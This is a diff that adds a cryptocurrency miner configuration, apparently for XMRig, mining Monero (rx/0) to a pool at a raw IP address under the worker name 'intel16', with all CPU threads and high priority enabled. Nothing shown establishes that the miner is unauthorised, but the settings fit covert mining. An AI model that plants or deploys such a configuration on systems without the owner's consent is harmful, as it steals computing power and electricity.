@@ -1,0 +1,36 @@
+{
+  "autosave": true,
+  "background": false,
+  "randomx": {
+    "mode": "fast",
+    "1gb-pages": true,
+    "numa": true,
+    "scratchpad_prefetch_mode": 1
+  },
+  "cpu": {
+    "enabled": true,
+    "asm": true,
+    "priority": 5,
+    "yield": false,
+    "huge-pages": true,
+    "huge-pages-jit": true,
+    "memory-pool": true,
+    "argon2-impl": "auto",
+    "max-threads-hint": 100,
+    "threads": "auto"
+  },
+  "http": {
+    "enabled": false
+  },
+  "pools": [
+    {
+      "algo": "rx/0",
+      "url": "64.188.79.231:3333",
+      "user": "intel16",
+      "pass": "x",
+      "keepalive": true,
+      "tls": false
+    }
+  ],
+  "donate-level": 1
+}
